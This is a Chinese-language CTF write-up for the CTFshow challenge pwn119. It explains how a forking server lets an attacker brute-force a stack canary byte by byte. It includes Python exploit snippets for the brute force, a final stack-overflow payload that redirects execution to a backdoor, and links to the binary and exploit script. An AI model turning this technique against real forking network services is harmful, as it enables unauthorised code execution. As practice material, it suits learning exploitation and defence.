---
title: CTFshow pwn119 fork 爆破 Canary
published: 2026-04-17
updated: 2026-04-17
description: 子进程崩溃不会影响父进程，于是可以按字节爆破 canary，最后再补完整 payload 进后门。
tags: [CTFshow, Pwn, Stack, Canary, Brute Force, Fork]
category: ctfshow
draft: false
---

# 题目结论

这题的核心不是格式化字符串，而是 `fork`。

服务端每次让子进程处理输入，子进程因为 canary 错误崩掉时，父进程还活着，所以我们可以一字节一字节试探 canary。只要回显里没有出现 `stack smashing detected`，就说明当前字节猜对了。

## 利用思路

1. canary 第一字节固定是 `0x00`
2. 逐字节从 `0x00` 到 `0xff` 试探
3. 某一字节猜对时，服务不会立刻报 stack smashing
4. 拼出完整 canary 后，正常覆盖返回地址

## 关键 exp 片段

```python
canary = b'\x00'
for i in range(3):
    for j in range(0, 256):
        payload = b'a' * (0x70 - 0xC) + canary + p8(j)
        io.send(payload)
        text = io.recv()
        if b"stack smashing detected" not in text:
            canary += p8(j)
            break
```

```python
payload = b'a' * (0x70 - 0xc) + canary + b'a' * 0xc + p32(backdoor)
io.send(payload)
```

## 下载

- [下载题目附件 `pwn`](../../attachments/ctfshow/pwn119/pwn)
- [下载利用脚本 `exp.py`](../../attachments/ctfshow/pwn119/exp.py)
- [下载原始笔记 `Bypass_pwn119.md`](../../attachments/ctfshow/pwn119/Bypass_pwn119.md)

## 适合记住的点

看到 `fork` / `accept -> fork` 这类服务端模型时，要立刻联想到 canary 爆破、ASLR 爆破和逐字节试探。
